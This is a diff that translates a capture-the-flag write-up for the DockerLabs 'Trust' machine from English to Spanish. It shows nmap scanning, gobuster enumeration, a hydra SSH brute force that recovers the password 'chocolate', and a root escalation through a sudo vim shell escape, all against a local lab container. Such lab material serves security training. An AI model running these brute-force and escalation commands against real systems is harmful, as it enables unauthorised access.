@@ -1,10 +1,10 @@
-# Write Up Trust
+# Writeup Trust
 
 **Difficulty:** Super easy<br>
-**Dockerlabs link:** https://dockerlabs.es/
+**Dockerlabs link:** [https://dockerlabs.es/](https://dockerlabs.es/)
 
-## Environment setup
-First of all, we deploy the machine using the script that comes when downloading it:
+## Preparación del entorno
+Lo primero es desplegar la máquina con el script que viene al descargarla:
 ```
 ❯ sudo ./auto_deploy.sh trust.tar
 [sudo] contraseña para godack: 
@@ -17,11 +17,11 @@ First of all, we deploy the machine using the script that comes when downloading
 	      \______ o          __/           
 	        \    \        __/            
 	         \____\______/               
-                                          
+                                           
   ___  ____ ____ _  _ ____ ____ _    ____ ___  ____ 
   |  \ |  | |    |_/  |___ |__/ |    |__| |__] [__  
   |__/ |__| |___ | \_ |___ |  \ |___ |  | |__] ___] 
-                                         
+                                          
 				    
 
 Estamos desplegando la máquina vulnerable, espere un momento.
@@ -31,7 +31,7 @@ Máquina desplegada, su dirección IP es -→ 172.18.0.2
 Presiona Ctrl+C cuando termines con la máquina para eliminarla
 ```
 
-Once deployed, we create the folder `trust-dockerlabs`, move inside, and use the *mkt* utility, which creates the folders *nmap*, *content*, *exploits* and *scripts*.
+Una vez desplegada, creamos la carpeta `trust-dockerlabs`, entramos y usamos la utilidad *mkt*, que crea las carpetas *nmap*, *content*, *exploits* y *scripts*.
 
 ```
 ❯ mkdir trust-dockerlabs
@@ -44,7 +44,7 @@ drwxrwxr-x godack godack 4.0 KB Sun Aug 17 10:41:42 2025  nmap
 drwxrwxr-x godack godack 4.0 KB Sun Aug 17 10:41:42 2025  scripts
 ```
 ## Recon
-Now that we know the IP address, we perform a full scan to find open ports in a stealthy and fast way:
+Ahora que sabemos la IP, hacemos un escaneo completo para encontrar puertos abiertos de forma sigilosa y rápida:
 ```
 ❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 172.18.0.2 -oG allPorts
 Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
@@ -66,8 +66,8 @@ PORT   STATE SERVICE REASON
 80/tcp open  http    syn-ack ttl 64
 ```
 
-So we discover that the open ports are SSH (22) and HTTP (80).  
-With the *extractPorts* utility we copy them to the clipboard and then run a more thorough scan to discover the service and version running on those ports.
+Así descubrimos que los puertos abiertos son SSH (22) y HTTP (80).
+Con la utilidad *extractPorts* los copiamos al portapapeles y luego lanzamos un escaneo más exhaustivo para descubrir el servicio y la versión de esos puertos.
 
 
 ```
@@ -99,8 +99,8 @@ PORT   STATE SERVICE VERSION
 |_http-server-header: Apache/2.4.57 (Debian)
 ```
 
-## Exploitation
-Since a web service and SSH are running, we first gather information from the webpage before trying SSH. To do this, we add an entry to our local DNS (/etc/hosts) with the machine’s name (`trust`) and its IP.
+## Explotación
+Como hay un servicio web y SSH corriendo, primero reunimos información de la web antes de probar SSH. Para ello añadimos una entrada a nuestro DNS local (/etc/hosts) con el nombre de la máquina (`trust`) y su IP.
 
 ```
 ❯ sudo vi /etc/hosts
@@ -116,7 +116,7 @@ Since a web service and SSH are running, we first gather information from the we
    5   │ 
 ───────┴──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
 ```
-Accessing the website shows the default Apache page with no useful info, so we try to enumerate directories with *gobuster*:
+Al acceder a la web vemos la página por defecto de Apache sin info útil, así que probamos a enumerar directorios con *gobuster*:
 
 ```
 ❯ gobuster dir -u http://trust/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-big.txt -t 20 -x html,php,txt,php.bak
@@ -143,7 +143,7 @@ Starting gobuster in directory enumeration mode
 /.html                (Status: 403) [Size: 270]
 /.php                 (Status: 403) [Size: 270]
 /server-status        (Status: 403) [Size: 270]
-/logitech-quickcam_W0QQcatrefZC5QQfbdZ1QQfclZ3QQfposZ95112QQfromZR14QQfrppZ50QQfsclZ1QQfsooZ1QQfsopZ1QQfssZ0QQfstypeZ1QQftrtZ1QQftrvZ1QQftsZ2QQnojsprZyQQpfidZ0QQsaatcZ1QQsacatZQ2d1QQsacqyopZgeQQsacurZ0QQsadisZ200QQsaslopZ1QQsofocusZbsQQsorefinesearchZ1.html (Status: 403) [Size: 270]
+/logitech-quickcam_W0QQcatrefZC5QQfbdZ1QQfclZ3QQfposZ95112QQfromZR14QQfrppZ50QQfsclZ1QQfsooZ1QQfsopZ1QQfsopZ1QQfssZ0QQfstypeZ1QQftrtZ1QQftrvZ1QQftsZ2QQnojsprZyQQpfidZ0QQsaatcZ1QQsacatZQ2d1QQsacqyopZgeQQsacurZ0QQsadisZ200QQsaslopZ1QQsofocusZbsQQsorefinesearchZ1.html (Status: 403) [Size: 270]
 /logitech-quickcam_W0QQcatrefZC5QQfbdZ1QQfclZ3QQfposZ95112QQfromZR14QQfrppZ50QQfsclZ1QQfsooZ1QQfsopZ1QQfssZ0QQfstypeZ1QQftrtZ1QQftrvZ1QQftsZ2QQnojsprZyQQpfidZ0QQsaatcZ1QQsacatZQ2d1QQsacqyopZgeQQsacurZ0QQsadisZ200QQsaslopZ1QQsofocusZbsQQsorefinesearchZ1.php.bak (Status: 403) [Size: 270]
 Progress: 6369160 / 6369165 (100.00%)
 ===============================================================
@@ -151,7 +151,7 @@ Finished
 ===============================================================
 ```
 
-We find a hidden page `/secret.php` that says:
+Encontramos una página oculta `/secret.php` que dice:
 
 ```
 Hola Mario,
@@ -160,8 +160,8 @@ Esta web no se puede hackear.
 ```
 ![alt text](../../images/writeups/Trust-secret.png)
 
-So we assume a possible username is **Mario**.  
-With no more info, the next step is brute-forcing SSH with *hydra*:
+Así que suponemos que un posible usuario es **Mario**.
+Sin más info, el siguiente paso es fuerza bruta a SSH con *hydra*:
 
 ```
 ❯ hydra -l mario -P /usr/share/wordlists/rockyou.txt ssh://trust
@@ -179,10 +179,10 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-08-18 20:05:
 Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-08-18 20:05:51
 ```
 
-And we obtain the password **chocolate**.
+Y obtenemos la contraseña **chocolate**.
 
-## Privilege Escalation
-Once inside, we stabilize the shell:
+## Escalada de privilegios
+Una vez dentro, estabilizamos la shell:
 
 ```
 script /dev/null -c bash
@@ -191,7 +191,7 @@ reset xterm
 export TERM=xterm
 ```
 
-Then we check what we can run with *sudo*:
+Luego comprobamos qué podemos correr con *sudo*:
 
 ```
 mario@f29b3bbef1a5:~$ sudo -l
@@ -203,7 +203,7 @@ User mario may run the following commands on f29b3bbef1a5:
     (ALL) /usr/bin/vim
 ```
 
-We abuse this to spawn a root shell:
+Abusamos de esto para lanzar una shell como root:
 
 ```
 mario@f29b3bbef1a5:~$ sudo vim -c ':!/bin/bash'
@@ -213,10 +213,10 @@ root
 root@f29b3bbef1a5:/home/mario# 
 ```
 
-Root obtained!
+¡Root conseguido!
 
-## Lessons Learned
-1. Scans with **nmap**
-2. Fuzzing with **gobuster**
-3. Brute force attack with **hydra**
-4. Privilege escalation with **vim**
+## Lecciones aprendidas
+1. Escaneos con **nmap**
+2. Fuzzing con **gobuster**
+3. Ataque de fuerza bruta con **hydra**
+4. Escalada de privilegios con **vim**
